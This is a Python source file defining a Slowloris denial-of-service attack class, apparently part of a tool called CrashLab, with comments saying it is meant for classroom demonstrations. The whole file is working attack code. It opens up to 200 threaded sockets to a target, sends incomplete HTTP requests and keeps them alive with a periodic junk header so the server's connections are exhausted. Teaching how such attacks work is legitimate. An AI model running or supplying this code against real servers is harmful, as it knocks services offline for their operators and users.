import socket
import random
import time
import threading
from .base import AttackBase

class Slowloris(AttackBase):
    def __init__(self, target, sockets=200, duration=60):
        super().__init__(target, duration)
        self.socket_count = sockets
        self.sockets = []

    def _start_threads(self):
        def slow_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            try:
                sock.connect((self.target.origin_ip or self.target.hostname, self.target.port))
                if self.target.scheme == 'https':
                    # Simplification: raw SSL not handled; for HTTPS use http layer approach
                    # In classroom, target should be HTTP for clear demonstration
                    pass
                # Send incomplete request
                sock.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n"
                         f"Host: {self.target.hostname}\r\n"
                         f"User-Agent: CrashLab\r\n"
                         "Accept: text/html\r\n".encode())
                self.sockets.append(sock)
            except:
                pass

        for _ in range(self.socket_count):
            t = threading.Thread(target=slow_worker)
            t.daemon = True
            self.threads.append(t)
            t.start()

        # Keep sockets alive by sending a header line occasionally
        while self._running:
            for sock in list(self.sockets):
                try:
                    sock.send(f"X-a: {random.randint(0,5000)}\r\n".encode())
                except:
                    self.sockets.remove(sock)
            time.sleep(15)

    def stop(self):
        super().stop()
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
